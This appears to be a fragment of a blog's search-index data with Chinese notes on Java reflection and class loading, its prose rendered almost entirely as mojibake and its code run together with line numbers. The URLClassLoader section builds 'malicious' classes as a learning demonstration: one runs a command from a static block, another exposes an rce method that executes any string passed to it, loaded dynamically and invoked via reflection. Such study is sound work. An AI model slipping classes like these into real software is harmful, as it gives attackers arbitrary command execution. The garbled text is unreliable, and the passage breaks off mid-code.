ä»¥ä¸Šçš„æ–¹æ³•è¿”å›å€¼ç±»å‹æ˜¯ä¸€ä¸ªClassç±»ï¼Œæ­¤ç±»æ˜¯Javaåå°„çš„æºå¤´ï¼Œå®é™…ä¸Šæ‰€è°“åå°„ä»ç¨‹åºçš„è¿è¡Œç»“æœæ¥çœ‹ä¹Ÿå¾ˆå¥½ç†è§£ï¼Œå³ï¼šå¯ä»¥é€šè¿‡å¯¹è±¡åå°„æ±‚å‡ºç±»çš„åç§° classç±»å¸¸ç”¨æ–¹æ³•ï¼š è·å–classç±»çš„å®ä¾‹ è‹¥å·²çŸ¥å…·ä½“çš„ç±»ï¼Œé€šè¿‡ç±»çš„classå±æ€§è·å–ï¼Œè¯¥æ–¹æ³•æœ€å®‰å…¨ã€å¯é  1Class clazz = Person.class; è‹¥å·²çŸ¥æŸä¸ªç±»çš„å®ä¾‹ï¼Œè°ƒç”¨è¯¥å®ä¾‹çš„getClass()æ–¹æ³•è·å–Classå¯¹è±¡ 1Class clazz = person.getClass(); å·²çŸ¥ä¸€ä¸ªç±»çš„å…¨åï¼Œä¸”è¯¥ç±»åœ¨ç±»è·¯å¾„ä¸‹ï¼Œå¯é€šè¿‡Classç±»çš„é™æ€æ–¹æ³•forName()è·å–ï¼Œå¯èƒ½ä¼šæŠ›å‡ºClassnotFoundException 1Class clazz = Class.forName(&quot;demo.Student&quot;) å†…ç½®åŸºæœ¬æ•°æ®ç±»å‹å¯ä»¥ç›´æ¥ç”¨ ç±»å.Type 1Integer.TYPE; intç±» è¿˜å¯ä»¥ç”¨ClassLoader åœ¨è¿™ä¸‰ç§è·å–CLassç±»æ–¹å¼ä¸­ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨ç¬¬ä¸‰ç§é€šè¿‡Class.forNameæ–¹æ³•å»åŠ¨æ€åŠ è½½ç±»ã€‚ä¸”ä½¿ç”¨forNameå°±ä¸éœ€è¦importå¯¼å…¥å…¶ä»–ç±»ï¼Œå¯ä»¥åŠ è½½æˆ‘ä»¬ä»»æ„çš„ç±»ã€‚ è€Œä½¿ç”¨ç±».classå±æ€§ï¼Œéœ€è¦å¯¼å…¥ç±»çš„åŒ…ï¼Œä¾èµ–æ€§å¤ªå¼ºï¼Œåœ¨å¤§å‹é¡¹ç›®ä¸­å®¹æ˜“æŠ›å‡ºç¼–è¯‘é”™è¯¯ï¼› è€Œä½¿ç”¨å®ä¾‹åŒ–å¯¹è±¡çš„getClass()æ–¹æ³•ï¼Œéœ€è¦æœ¬èº«åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œæœ¬èº«å°±æ²¡æœ‰äº†ä½¿ç”¨åå°„æœºåˆ¶æ„ä¹‰ã€‚ æ‰€ä»¥æˆ‘ä»¬åœ¨è·å–classå¯¹è±¡ä¸­ï¼Œä¸€èˆ¬ä½¿ç”¨Class.forNameæ–¹æ³•å»è·å–ã€‚ å“ªäº›ç±»å‹å¯ä»¥æœ‰Classå¯¹è±¡ï¼Ÿ classï¼šå¤–éƒ¨ç±»ã€æˆå‘˜ã€å±€éƒ¨å†…éƒ¨ç±»ã€åŒ¿åå†…éƒ¨ç±» interfaceï¼šæ¥å£ []ï¼šæ•°ç»„ enumï¼šæšä¸¾ annotationï¼šæ³¨è§£@interface primitive typeï¼šåŸºæœ¬æ•°æ®ç±»å‹ void &lt;7&gt;ç±»åŠ è½½è¿‡ç¨‹(1) ç±»åŠ è½½ä¸ClassLoaderç†è§£ åŠ è½½ï¼šå°†classæ–‡ä»¶å­—èŠ‚ç å†…å®¹åŠ è½½åˆ°å†…å­˜ä¸­ã€‚å°†è¿™äº›é™æ€æ•°æ®ç»“æ„è½¬æ¢æˆæ–¹æ³•åŒºçš„è¿è¡Œæ—¶æ•°æ®ç»“æ„ï¼Œç„¶åç”Ÿæˆä¸€ä¸ªä»£è¡¨è¿™ä¸ªç±»çš„java.lang.Classå¯¹è±¡ é“¾æ¥ï¼šå°†javaç±»çš„äºŒè¿›åˆ¶ä»£ç åˆå¹¶åˆ°JVMçš„è¿è¡ŒçŠ¶æ€ä¹‹ä¸­çš„è¿‡ç¨‹ éªŒè¯ï¼šç¡®ä¿åŠ è½½çš„ç±»ä¿¡æ¯ç¬¦åˆJVMè§„èŒƒï¼Œæ²¡æœ‰å®‰å…¨æ–¹é¢é—®é¢˜ å‡†å¤‡ï¼šæ­£å¼ä¸ºç±»å˜é‡(static)åˆ†é…å†…å­˜å¹¶è®¾ç½®ç±»å˜é‡é»˜è®¤åˆå§‹å€¼çš„é˜¶æ®µï¼Œè¿™äº›å†…å­˜éƒ½å°†åœ¨æ–¹æ³•åŒºä¸­è¿›è¡Œåˆ†é…ã€‚ è§£æï¼šè™šæ‹Ÿæœºå¸¸é‡æ± å†…çš„ç¬¦å·å¼•ç”¨(å¸¸é‡å)æ›¿æ¢ä¸ºç›´æ¥å¼•ç”¨(åœ°å€)çš„è¿‡ç¨‹ åˆå§‹åŒ–ï¼š æ‰§è¡Œç±»æ„é€ å™¨()æ–¹æ³•çš„è¿‡ç¨‹ã€‚ç±»æ„é€ å™¨()æ–¹æ³•æ˜¯ç”±ç¼–è¯‘æœŸè‡ªåŠ¨æ”¶é›†ç±»ä¸­æ‰€æœ‰ç±»å˜é‡çš„èµ‹å€¼åŠ¨ä½œå’Œé™æ€ä»£ç å—ä¸­çš„è¯­å¥åˆå¹¶äº§ç”Ÿçš„(ç±»æ„é€ å™¨æ˜¯æ„é€ ç±»ä¿¡æ¯çš„ï¼Œä¸æ˜¯æ„é€ è¯¥ç±»å¯¹è±¡çš„æ„é€ å™¨) å½“åˆå§‹åŒ–ä¸€ä¸ªç±»çš„æ—¶å€™ï¼Œå¦‚æœå‘ç°å…¶çˆ¶ç±»è¿˜æ²¡æœ‰è¿›è¡Œåˆå§‹åŒ–ï¼Œåˆ™éœ€è¦å…ˆè§¦å‘å…¶çˆ¶ç±»çš„åˆå§‹åŒ– è™šæ‹Ÿæœºä¼šä¿è¯ä¸€ä¸ªç±»çš„()æ–¹æ³•åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­è¢«æ­£ç¡®åŠ é”å’ŒåŒæ­¥ é™æ€ä»£ç å—å’Œé™æ€ä»£ç è¯­å¥æ‰§è¡Œé¡ºåºå–å†³äºç¼–å†™é¡ºåº 123456789101112131415161718192021222324252627282930313233public class test05 { public static void main(String[] args) { A a = new A(); System.out.println(a.m); /* * 1. åŠ è½½åˆ°å†…å­˜ï¼Œä¼šäº§ç”Ÿä¸€ä¸ªç±»å¯¹åº”Classå¯¹è±¡ * 2. é“¾æ¥ï¼Œé“¾æ¥ç»“æŸåm=0 * 3. åˆå§‹åŒ– * &lt;clinit&gt;(){ * System.out.println(&quot;Aç±»é™æ€ä»£ç å—åˆå§‹åŒ–&quot;); * m = 300; * m = 100 * } * æ‰€ä»¥ m=100 */ }}class A{ { System.out.println(&quot;Empty block initial&quot;); } static { System.out.println(&quot;Aç±»é™æ€ä»£ç å—åˆå§‹åŒ–&quot;); m = 300; } static int m = 100; public A(){ System.out.println(&quot;Aç±»çš„æ— å‚æ„é€ åˆå§‹åŒ–&quot;); }è¾“å‡ºï¼š Aç±»é™æ€ä»£ç å—åˆå§‹åŒ– Empty block initial Aç±»çš„æ— å‚æ„é€ åˆå§‹åŒ– é¦–å…ˆè°ƒç”¨çš„æ˜¯ static{} å…¶æ¬¡æ˜¯ {} ç„¶åæ˜¯æ„é€ å‡½æ•° å…¶ä¸­ï¼Œ static {} å°±æ˜¯åœ¨â€œç±»åˆå§‹åŒ–â€çš„æ—¶å€™è°ƒâ½¤çš„ï¼Œâ½½ {} ä¸­çš„ä»£ç ä¼šæ”¾åœ¨æ„é€ å‡½æ•°çš„ super() åâ¾¯ï¼Œ ä½†åœ¨å½“å‰æ„é€ å‡½æ•°å†…å®¹çš„å‰â¾¯ (2) ç±»åŠ è½½å™¨ä½œç”¨ç±»åŠ è½½å™¨ä½œç”¨ï¼š å°†classæ–‡ä»¶å­—èŠ‚ç å†…å®¹åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå¹¶å°†è¿™äº›é™æ€æ•°æ®ç»“æ„è½¬æ¢æˆæ–¹æ³•åŒºçš„è¿è¡Œæ—¶æ•°æ®ç»“æ„ï¼Œç„¶ååœ¨å †ä¸­ç”Ÿæˆä¸€ä¸ªä»£è¡¨è¿™ä¸ªç±»çš„java.lang.Classå¯¹è±¡ï¼Œä½œä¸ºæ–¹æ³•åŒºä¸­ç±»æ•°æ®çš„è®¿é—®å…¥å£ ç±»ç¼“å­˜ï¼š æ ‡å‡†çš„JavaSEç±»åŠ è½½å™¨å¯ä»¥æŒ‰è¦æ±‚æŸ¥æ‰¾ç±»ï¼Œä½†ä¸€æ—¦æŸä¸€ä¸ªç±»è¢«åŠ è½½åˆ°ç±»åŠ è½½å™¨ä¸­ï¼Œä»–å°†ç»´æŒåŠ è½½(ç¼“å­˜)ä¸€æ®µæ—¶é—´ï¼Œä¸è¿‡ JVM åƒåœ¾å›æ”¶æœºåˆ¶å¯ä»¥å›æ”¶è¿™äº›Classå¯¹è±¡ (3) â˜…è·å–è¿è¡Œæ—¶ç±»çš„å®Œæ•´ç»“æ„é€šè¿‡åå°„è·å–è¿è¡Œæ—¶ç±»çš„å®Œæ•´ç»“æ„ Fieldã€Methodã€Constructorã€Superclassã€Interfaceã€Annotation å®ç°çš„å…¨éƒ¨æ¥å£ ç»§æ‰¿çš„çˆ¶ç±» å…¨éƒ¨çš„æ„é€ å™¨ å…¨éƒ¨æ–¹æ³• å…¨éƒ¨Field æ³¨è§£ 1234567891011121314151617181920212223242526272829303132333435363738394041424344import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;public class test08 { public static void main(String[] args) throws ClassNotFoundException{ // Class c1 = Class.forName(&quot;com.lv.Reflection.User&quot;); User user = new User(); Class c1 = user.getClass(); System.out.println(c1.getName()); //åŒ…å+ç±»å System.out.println(c1.getSimpleName()); //è·å¾—ç±»çš„å±æ€§ System.out.println(&quot;==========================&quot;); Field[] fields = c1.getFields(); //åªèƒ½è·å–éç§æœ‰ //æœ‰Declaredå­—çœ¼çš„éƒ½æ˜¯è·å–æœ¬ç±»æ‰€æœ‰ä»»ä½•è®¿é—®çº§åˆ«çš„æ•°æ®,æ²¡æœ‰çš„å¯ä»¥è·å–æœ¬ç±»åŠçˆ¶ç±»æ‰€æœ‰å…¬å…±çº§åˆ«çš„æ•°æ® å³è·å–æ‰€æœ‰å±æ€§ fields = c1.getDeclaredFields(); for (Field field:fields){ System.out.println(field); } //è·å¾—ç±»çš„æ–¹æ³• System.out.println(&quot;==========================&quot;); Method[] methods = c1.getMethods(); //è·å¾—æœ¬ç±»åŠå…¶çˆ¶ç±»çš„æ‰€æœ‰publicæ–¹æ³• for (Method method : methods) { System.out.println(&quot;æ­£å¸¸çš„&quot;+method); } methods = c1. getDeclaredMethods(); //è·å–æœ¬ç±»çš„æ‰€æœ‰æ–¹æ³•(åŒ…æ‹¬ç§æœ‰) for (Method method : methods) { System.out.println(&quot;getDeclaredmethods:&quot;+method); } //è·å–æŒ‡å®šçš„æ„é€ å™¨ System.out.println(&quot;==========================&quot;); Constructor[] constructors = c1.getConstructors(); //è·å–æ€•publicæ–¹æ³• for (Constructor constructor : constructors) { System.out.println(constructor); } constructors = c1.getDeclaredConstructors(); //è·å–å…¨éƒ¨çš„ for (Constructor constructor : constructors) { System.out.println(constructor); } }} å°ç»“ï¼š ç†Ÿæ‚‰java. l an g. reflectåŒ…çš„ä½œç”¨ï¼Œåå°„æœºåˆ¶ å¦‚ä½•è·å–å±æ€§ã€æ–¹æ³• ã€æ„é€ å™¨åç§°ã€ä¿®é¥°ç¬¦ç­‰ (4) â˜…æœ‰äº†Classå¯¹è±¡ï¼Œèƒ½åšä»€ä¹ˆï¼Ÿåˆ›å»ºç±»çš„å¯¹è±¡ï¼šè°ƒç”¨Classå¯¹è±¡çš„newInstance()æ–¹æ³• ç±»å¿…é¡»æœ‰ä¸€ä¸ªæ— å‚æ•°çš„æ„é€ å™¨ ç±»çš„æ„é€ å™¨çš„è®¿é—®æƒé™éœ€è¦è¶³å¤Ÿ æ€è€ƒï¼š éš¾é“æ²¡ç”¨æ— å‚çš„æ„é€ å™¨å°±ä¸èƒ½åˆ›å»ºå¯¹è±¡äº†å—ï¼Ÿåªè¦åœ¨æ“ä½œçš„æ—¶å€™æ˜ç¡®çš„è°ƒç”¨ç±»ä¸­çš„æ„é€ å™¨å¹¶å°†å‚æ•°ä¼ é€’è¿›å»ä¹‹åï¼Œæ‰å¯ä»¥å®ä¾‹åŒ–æ“ä½œã€‚ æ­¥éª¤å¦‚ä¸‹ï¼š é€šè¿‡Classç±»çš„getDeclaredConstructor()å–å¾—æœ¬ç±»çš„æŒ‡å®šå½¢å‚ç±»å‹çš„æ„é€ å™¨ å‘æ„é€ å™¨çš„å½¢å‚ä¸­ä¼ é€’ä¸€ä¸ªå¯¹è±¡æ•°ç»„è¿›å»ï¼Œé‡Œé¢åŒ…å«äº†æ„é€ å™¨ä¸­æ‰€éœ€çš„å„ä¸ªå‚æ•° é€šè¿‡Constructorå®ä¾‹åŒ–å¯¹è±¡ 1234567891011121314151617181920212223242526272829303132333435import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class Test09 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException { //è·å¾—Classå¯¹è±¡ Class c1=Class.forName(&quot;com.lv.Reflection.User&quot;); User user = (User) c1.getDeclaredConstructor(String.class,int.class,int.class).newInstance(&quot;gaga&quot;,001,18); //jdké«˜ç‰ˆæœ¬ ç›´æ¥c1.newInstance()è¢«å¼ƒç”¨äº† System.out.println(user); //é€šè¿‡åå°„è°ƒç”¨æ™®é€šæ–¹æ³• User user2 = (User) c1.getDeclaredConstructor().newInstance(); //é€šè¿‡åå°„è·å–ä¸€ä¸ªæ–¹æ³• Method setName = c1.getDeclaredMethod(&quot;setName&quot;, String.class); //invokeï¼šæ¿€æ´»çš„æ„æ€ //(å¯¹è±¡ï¼Œ&quot;æ–¹æ³•çš„å€¼&quot;) setName.invoke(user2,&quot;1vxyz&quot;); System.out.println(user2.getName()); //é€šè¿‡åå°„æ“ä½œå±æ€§ System.out.println(&quot;==========================&quot;); User user3 = (User) c1.getDeclaredConstructor().newInstance(); Field name = c1.getDeclaredField(&quot;name&quot;); //ä¸èƒ½ç›´æ¥æ“ä½œç§æœ‰å±æ€§ï¼Œæˆ‘ä»¬éœ€è¦å…³é—­ç¨‹åºçš„å®‰å…¨æ£€æµ‹ï¼Œé€šè¿‡å±æ€§æˆ–è€…æ–¹æ³•çš„setAccessible(true) name.setAccessible(true); // name.set(user3,&quot;1vxyz2&quot;); System.out.println(user3.getName()); } setAccessible Methodå’ŒFieldã€Constructorå¯¹è±¡éƒ½æœ‰setAccessible()æ–¹æ³• setAccessibleçš„ä½œç”¨æ˜¯å¯åŠ¨å’Œç¦ç”¨è®¿é—®å®‰å…¨æ£€æŸ¥çš„å¼€å…³ å‚æ•°å€¼ä¸ºtrueåˆ™æŒ‡ç¤ºåå°„çš„ä»£ç åœ¨ä½¿ç”¨æ—¶åº”å–æ¶ˆjavaè¯­è¨€çš„è®¿é—®æ£€æŸ¥ å¦‚æœä»£ç ä¸­å¿…é¡»ç”¨åå°„ï¼Œè¯¥å¥ä»£ç éœ€è¦é¢‘ç¹çš„è¢«è°ƒç”¨ï¼Œè®¾ç½®ä¸ºtrue ä½¿å¾—åŸæœ¬æ— æ³•è®¿é—®çš„ç§æœ‰æˆå‘˜ä¹Ÿå¯ä»¥è¢«è®¿é—® å‚æ•°å€¼ä¸ºfalseåˆ™æŒ‡ç¤ºåå°„çš„å¯¹è±¡åº”è¯¥å®æ–½javaè¯­è¨€è®¿é—®æ£€æŸ¥ æ€§èƒ½åˆ†æï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;//æ€§èƒ½å¯¹æ¯”åˆ†æpublic class test10 { //æ™®é€šæ–¹å¼è°ƒç”¨ public static void test01(){ User user = new User(); long startTime = System.currentTimeMillis(); for (int i = 0; i &lt; 1000000000; i++) { user.getName(); } long endTime = System.currentTimeMillis(); System.out.println(&quot;æ™®é€šæ–¹å¼æ‰§è¡Œ10äº¿æ¬¡ï¼š&quot;+(endTime-startTime)+&quot;ms&quot;); } //åå°„æ–¹å¼è°ƒç”¨ public static void test02() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException { User user = new User(); Class c1 = user.getClass(); Method getName = c1.getDeclaredMethod(&quot;getName&quot;, null); long startTime = System.currentTimeMillis(); for (int i = 0; i &lt; 1000000000; i++) { getName.invoke(user,null); } long endTime = System.currentTimeMillis(); System.out.println(&quot;æ™®é€šæ–¹å¼æ‰§è¡Œ10äº¿æ¬¡ï¼š&quot;+(endTime-startTime)+&quot;ms&quot;); } //åå°„æ–¹å¼è°ƒç”¨ å…³é—­æ£€æµ‹ public static void test03() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException { User user = new User(); Class c1 = user.getClass(); Method getName = c1.getDeclaredMethod(&quot;getName&quot;, null); getName.setAccessible(true); long startTime = System.currentTimeMillis(); for (int i = 0; i &lt; 1000000000; i++) { getName.invoke(user,null); } long endTime = System.currentTimeMillis(); System.out.println(&quot;æ™®é€šæ–¹å¼æ‰§è¡Œ10äº¿æ¬¡ï¼š&quot;+(endTime-startTime)+&quot;ms&quot;); } public static void main(String[] args) throws InvocationTargetException, NoSuchMethodException, IllegalAccessException { test01(); test02(); test03(); }} å­¦ä¹ æ¥æºï¼šhttps://www.bilibili.com/video/BV1p4411P7V3/?spm_id_from=333.999.0.0","link":"/2023/03/27/Java%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%B3%A8%E8%A7%A3%E4%B8%8E%E5%8F%8D%E5%B0%84/"},{"title":"JavaåŸºç¡€ç¯‡-ç±»åŠ è½½æœºåˆ¶","text":"&lt;1&gt;JavacåŸç†javacæ˜¯ç”¨äºå°†æºç æ–‡ä»¶.javaç¼–è¯‘æˆå¯¹åº”çš„å­—èŠ‚ç æ–‡ä»¶.classã€‚å…¶æ­¥éª¤æ˜¯ï¼šæºç â€”â€”&gt;è¯æ³•åˆ†æå™¨ç»„ä»¶ï¼ˆç”Ÿæˆtokenæµï¼‰â€”â€”&gt;è¯­æ³•åˆ†æå™¨ç»„ä»¶ï¼ˆè¯­æ³•æ ‘ï¼‰â€”â€”&gt;è¯­ä¹‰åˆ†æå™¨ç»„ä»¶ï¼ˆæ³¨è§£è¯­æ³•æ ‘ï¼‰â€”â€”&gt;ä»£ç ç”Ÿæˆå™¨ç»„ä»¶ï¼ˆå­—èŠ‚ç ï¼‰ &lt;2&gt;ç±»åŠ è½½è¿‡ç¨‹å…ˆåœ¨æ–¹æ³•åŒºæ‰¾classä¿¡æ¯ï¼Œæœ‰çš„è¯ç›´æ¥è°ƒç”¨ï¼Œæ²¡æœ‰çš„è¯åˆ™ä½¿ç”¨ç±»åŠ è½½å™¨åŠ è½½åˆ°æ–¹æ³•åŒºï¼ˆé™æ€æˆå‘˜æ”¾åœ¨é™æ€åŒºï¼Œéé™æ€æˆåŠŸæ”¾åœ¨éé™æ€åŒºï¼‰ï¼Œé™æ€ä»£ç å—åœ¨ç±»åŠ è½½æ—¶è‡ªåŠ¨æ‰§è¡Œä»£ç ï¼Œéé™æ€çš„ä¸æ‰§è¡Œï¼›å…ˆçˆ¶ç±»åå­ç±»ï¼Œå…ˆé™æ€åéé™æ€ï¼›é™æ€æ–¹æ³•å’Œéé™æ€æ–¹æ³•éƒ½æ˜¯è¢«åŠ¨è°ƒç”¨ï¼Œå³ä¸è°ƒç”¨å°±ä¸æ‰§è¡Œ 123456789101112131415161718192021222324252627282930313233public class test05 { public static void main(String[] args) { A a = new A(); System.out.println(a.m); /* * 1. åŠ è½½åˆ°å†…å­˜ï¼Œä¼šäº§ç”Ÿä¸€ä¸ªç±»å¯¹åº”Classå¯¹è±¡ * 2. é“¾æ¥ï¼Œé“¾æ¥ç»“æŸåm=0 * 3. åˆå§‹åŒ– * &lt;clinit&gt;(){ * System.out.println(&quot;Aç±»é™æ€ä»£ç å—åˆå§‹åŒ–&quot;); * m = 300; * m = 100 * } * æ‰€ä»¥ m=100 */ }}class A{ { System.out.println(&quot;Empty block initial&quot;); } static { System.out.println(&quot;Aç±»é™æ€ä»£ç å—åˆå§‹åŒ–&quot;); m = 300; } static int m = 100; public A(){ System.out.println(&quot;Aç±»çš„æ— å‚æ„é€ åˆå§‹åŒ–&quot;); }è¾“å‡ºï¼š Aç±»é™æ€ä»£ç å—åˆå§‹åŒ– Empty block initial Aç±»çš„æ— å‚æ„é€ åˆå§‹åŒ– é¦–å…ˆè°ƒç”¨çš„æ˜¯ static{} å…¶æ¬¡æ˜¯ {} ç„¶åæ˜¯ æ— å‚æ„é€  æœ‰å‚æ„é€  å…¶ä¸­ï¼Œ static {} å°±æ˜¯åœ¨â€œç±»åˆå§‹åŒ–â€çš„æ—¶å€™è°ƒâ½¤çš„ï¼Œâ½½ {} ä¸­çš„ä»£ç ä¼šæ”¾åœ¨æ„é€ å‡½æ•°çš„ super() åâ¾¯ï¼Œ ä½†åœ¨å½“å‰æ„é€ å‡½æ•°å†…å®¹çš„å‰â¾¯ &lt;3&gt; åŠ¨æ€åŠ è½½å­—èŠ‚ç (1)å­—èŠ‚ç çš„æ¦‚å¿µä¸¥æ ¼æ¥è¯´ï¼ŒJava å­—èŠ‚ç ï¼ˆByteCodeï¼‰å…¶å®ä»…ä»…æŒ‡çš„æ˜¯ Java è™šæ‹Ÿæœºæ‰§è¡Œä½¿ç”¨çš„ä¸€ç±»æŒ‡ä»¤ï¼Œé€šå¸¸è¢«å­˜å‚¨åœ¨ .class æ–‡ä»¶ä¸­ è€Œå­—èŠ‚ç çš„è¯ç”Ÿæ˜¯ä¸ºäº†è®© JVM çš„æµé€šæ€§æ›´å¼ºï¼Œå¯ä»¥çœ‹ä¸‹é¢å›¾ç†è§£ä¸€ä¸‹ (2)ç±»åŠ è½½å™¨çš„åŸç†ä»å‰é¢æåˆ°çš„ä»£ç å—çš„åŠ è½½é¡ºåºæˆ‘ä»¬å¾—çŸ¥ï¼šåœ¨ loadClass() æ–¹æ³•è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œæ˜¯ä¸è¿›è¡Œç±»çš„åˆå§‹åŒ–çš„ åŒäº²å§”æ´¾æœºåˆ¶ç±»åŠ è½½è®¿é—®æµç¨‹ï¼š ClassLoader â€”-&gt; SecureClassLoader â€”&gt; URLClassLoader â€”-&gt; APPClassLoader â€”-&gt; loadClass() â€”-&gt; findClass() load_class ClassLoader -&gt; SecureClassLoader -&gt; URLClassLoader -&gt; AppClassLoader loadClass() -&gt; findClass(é‡å†™çš„æ–¹æ³•) -&gt; defineClass(ä»å­—èŠ‚ç åŠ è½½ç±») URLClassLoader ä»»æ„ç±»åŠ è½½ï¼šfile/http/jar ClassLoader.defineClass å­—èŠ‚ç åŠ è½½ä»»æ„ç±» UnSafe.defineClass å­—èŠ‚ç åŠ è½½ä»»æ„ç±» è™½æ˜¯publicç±»ï¼Œä½†ä¸èƒ½ç›´æ¥ç”Ÿæˆ Springé‡Œå¯ä»¥ç›´æ¥ç”Ÿæˆ ä¸‹é¢æ¼”ç¤ºï¼š (3)URLClassLoaderç±»åŠ è½½classæ–‡ä»¶ â˜…URLClassLoader å®é™…ä¸Šæ˜¯æˆ‘ä»¬å¹³æ—¶é»˜è®¤ä½¿ç”¨çš„ AppClassLoader çš„çˆ¶ç±»ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬è§£é‡Š URLClassLoader çš„å·¥ä½œè¿‡ç¨‹å®é™…ä¸Šå°±æ˜¯åœ¨è§£é‡Šé»˜è®¤çš„ Java ç±»åŠ è½½å™¨çš„å·¥ä½œæµç¨‹ã€‚ æ­£å¸¸æƒ…å†µä¸‹ï¼ŒJavaä¼šæ ¹æ®é…ç½®é¡¹ sun.boot.class.path å’Œ java.class.path ä¸­åˆ—ä¸¾åˆ°çš„åŸºç¡€è·¯å¾„ï¼ˆè¿™äº›è·¯å¾„æ˜¯ç»è¿‡å¤„ç†åçš„ java.net.URL ç±»ï¼‰æ¥å¯»æ‰¾.classæ–‡ä»¶æ¥åŠ è½½ï¼Œè€Œè¿™ä¸ªåŸºç¡€è·¯å¾„æœ‰åˆ†ä¸ºä¸‰ç§æƒ…å†µï¼š â‘ ï¼šURLæœªä»¥æ–œæ  / ç»“å°¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ªJARæ–‡ä»¶ï¼Œä½¿ç”¨ JarLoader æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨JaråŒ…ä¸­å¯»æ‰¾.classæ–‡ä»¶ â‘¡ï¼šURLä»¥æ–œæ  / ç»“å°¾ï¼Œä¸”åè®®åæ˜¯ file ï¼Œåˆ™ä½¿ç”¨ FileLoader æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å¯»æ‰¾.classæ–‡ä»¶ â‘¢ï¼šURLä»¥æ–œæ  / ç»“å°¾ï¼Œä¸”åè®®åä¸æ˜¯ file ï¼Œåˆ™ä½¿ç”¨æœ€åŸºç¡€çš„ Loader æ¥å¯»æ‰¾ç±» URLClassLoader:è¾“å…¥ä¸€ä¸ªURL,ä»URLå†…åŠ è½½ä¸€ä¸ªç±»å‡ºæ¥ ä¾‹ä¸€ï¼š æ„é€ ä¸€ä¸ªæ¶æ„ç±»1234567891011121314package load_class;import java.io.IOException;public class URLClassLoader_evilHello { static { try { Runtime.getRuntime().exec(&quot;calc&quot;); } catch (IOException e) { e.printStackTrace(); } }} javac URLClassLoader_evilHello.java ç”Ÿæˆ.classæ–‡ä»¶ç¼–è¯‘åŠ¨æ€åŠ è½½ç±»12345678910111213141516import java.lang.reflect.InvocationTargetException;import java.net.MalformedURLException;import java.net.URL;import java.net.URLClassLoader;public class URLClassLoader_load_class { public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException { // URLClassLoader:è¾“å…¥ä¸€ä¸ªURL,ä»URLå†…åŠ è½½ä¸€ä¸ªç±»å‡ºæ¥ URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(&quot;file:D:\\\\Java-IDEA\\\\java_workspace\\\\zhujie\\\\src\\\\&quot;)}); Class&lt;?&gt; c = urlClassLoader.loadClass(&quot;URLClassLoader_evilHello&quot;); c.newInstance(); //c.getDeclaredConstructor().newInstance(); }} javaçš„ç±»åŠ è½½æœºåˆ¶ï¼Œå¯ä»¥è®©ç±»åˆå§‹åŒ–æ—¶ï¼Œä¼šæ‰§è¡Œstaticé™æ€åŒºé‡Œçš„ä»£ç ï¼Œè¿™é‡Œæˆ‘ä»¬é€šè¿‡URLClassLoaderç±»åŠ è½½äº†URLClassLoader_evilHello.class æ–‡ä»¶ï¼ŒåŠ è½½äº†æ¶æ„ç±»ã€‚èµ‹å€¼ç»™ Class cï¼Œç„¶åæˆ‘ä»¬ c.newInstance();å®ä¾‹åŒ–ï¼Œåˆå§‹åŒ–ä¼šæ‰§è¡Œstaticé™æ€åŒºé‡Œçš„ä»£ç ï¼Œå¼¹å‡ºæ¥äº†è®¡ç®—å™¨ã€‚ ä¾‹äºŒï¼š å†æ„é€ ä¸€ä¸ªæ¶æ„ Testç±»ï¼š 12345678910import java.io.IOException;public class Test { public Test() { } public static void rce(String var0) throws IOException { Runtime.getRuntime().exec(var0); }} åˆ©ç”¨URLClassLoaderåŠ¨æ€åŠ è½½æ¶æ„ç±»ï¼Œå†åˆ©ç”¨åå°„è°ƒç”¨é‡Œé¢çš„rceæ–¹æ³• 123456789101112131415161718192021222324252627import java.lang.reflect.InvocationTargetException;import java.net.MalformedURLException;import java.net.URL;import java.net.URLClassLoader;public class loadclass { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, MalformedURLException { // ä»urlæŒ‡å®šçš„ç›®å½•ä¸‹åŠ è½½.classæ–‡ä»¶ /* * ä½¿ç”¨é»˜è®¤å§”æ‰˜çˆ¶ç±»åŠ è½½å™¨ä¸ºæŒ‡å®šçš„URLæ„é€ ä¸€ä¸ªæ–°çš„URLClassLoaderã€‚ åœ¨çˆ¶ç±»åŠ è½½å™¨ä¸­é¦–æ¬¡æœç´¢åï¼Œ * å°†æŒ‰ç…§ä¸ºç±»å’Œèµ„æºæŒ‡å®šçš„é¡ºåºæœç´¢ URLã€‚ ä»»ä½•ä»¥â€œ/â€ç»“å°¾çš„ URL éƒ½è¢«å‡å®šä¸ºæŒ‡å‘ä¸€ä¸ªç›®å½•ã€‚ å¦åˆ™ï¼Œè¯¥ URL * è¢«å‡å®šä¸ºå¼•ç”¨ä¸€ä¸ª JAR æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å°†æ ¹æ®éœ€è¦ä¸‹è½½å’Œæ‰“å¼€ã€‚ * å› æ­¤æ‚¨æœ‰ä¸¤ä¸ªé€‰æ‹©ï¼š * Refer to the directory that the .class file is in * Put the .class file into a JAR and refer to that * */ URL url = new URL(&quot;file:D:\\\\Java-IDEA\\\\java_workspace\\\\zhujie\\\\src\\\\&quot;); // åˆ›å»ºURLClassLoaderåŠ è½½æœ¬åœ°.classæ–‡ä»¶ URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url}); 